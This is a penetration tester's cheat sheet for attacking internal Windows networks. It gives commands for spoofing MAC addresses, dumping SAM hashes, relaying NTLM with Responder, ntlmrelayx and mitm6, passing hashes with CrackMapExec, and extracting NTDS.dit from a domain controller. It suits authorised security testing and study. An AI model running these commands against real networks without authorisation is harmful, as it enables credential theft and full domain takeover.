# Internal Penetration Testing

## 1. **No network access**

### Wi-Fi

* Crack WPA or crack/replay PEAP

> For more details, see next cheatsheet : [WiFi](02-wifi.md)

### NAC - MAC filtering

1. Spoof mac from any authorized device \(e.g printer or voip phone\) and disconnect it: 
```sh
macchanger -r eth0
```
2. force your static IP to match the one that you spoofed the mac from : 
```sh
sudo ifconfig 10.11.12.13/24 && sudo ip route add default via <gateway_ip>
```

### NAC - 802.1X

* [Fenrir](https://github.com/Orange-Cyberdefense/fenrir-ocd) (IEEE 802.1X bypass)

---

##2. **No account yet**

### Physical access

Boot from Kali Linux and dump creds

```bash
cd SystemRoot%\system32\Config\SAM
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
```
> For more details, see next cheatsheet : [Windows Post Exploitation](05-post-exploitation-windows.md)

### Port and service scan

nmap

```sh
nmap -Pn -n -sSUV -n -vvv --reason -pT:137-139,445,U:137-139 -oA SMB <hosts>
nmap --version-all -sV -sC -oA top1000 <hosts>
nmap --version-all -sV -sC -p- -oA allports <hosts>
```

Search for low hanging fruits \(MS17 / default password TOMCAT VNC ... \)

```bash
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/http/tomcat_mgr_login
searchsploit <service_name>
```

### Man-In-The-Middle

Responder + NTLMrelayx

1. First we need to edit  responder.conf like this :

`vim /usr/share/responder/Responder.conf`

```bash
[Responder Core]

; Servers to start
SQL = On
SMB = Off     # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    # Turn this off
HTTPS = On
DNS = On
LDAP = On
```

2. Then we create a list of targets :

```bash
nmap -T4 -Pn -p 445 --open -oA <outfile> <targets>
cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt
cme smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
```

> if the scope is small : `cme smb <targets> --gen-relay-list relaylistOutputFilename.txt`

3. After we can run Responder + ntlmrelayx

```bash
python Responder.py -I <interface> -rdw
ntlmrelayx.py -tf relaylistOutputFilename.txt
```

> This command will generate many log files which contain SAM hashes, just get all these files and store it into a formatted file that includes all hashes. \( `cat *.sam |sort -u > hashs.txt` \) Then you can just run CrackMapExec on full scope using theses hashes :

`crackmapexec smb perim_up_smb.txt -u Administrator -d '.' -H hashs.txt --lsa`

mitm6 + NTLMrelayx

```bash
sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
ntlmrelayx.py -tf relaylistOutputFilename.txt -6 
```

ARP \(use with caution !\)

```bash
Bettercap
Cain.exe (& Abel)
```

---

## Unprivileged account only 

### Get a shell

> For more details, see next cheatsheets : [Shell](../useful-commands/shell.md) and [AV Bypass](09-antivirus-bypasss)

---

### Local Privilege Escalation

> For more details, see next cheatsheet : [Local Privilege Escalation Windows](03-lpe-windows.md)

---

### Domain Escalation

> For more details, see next cheatsheet : [Domain Escalation](08-domain-escalation.md)

---

## **Local Admin account**

### Post-Exploitation

> For more details, see next cheatsheet : [Local Privilege Escalation Windows](05-post-exploitation-windows.md)

### Replay the secrets found

Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec

```bash
crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa
```

### Pivoting

> For more details, see next cheatsheet : [Pivoting](07-pivoting.md)

---

## **Domain admin account**

### Dump NDTS.dit from DC

```bash
cme smb 192.168.1.100 -u <domain_admin> -p '<pass>' --ntds
```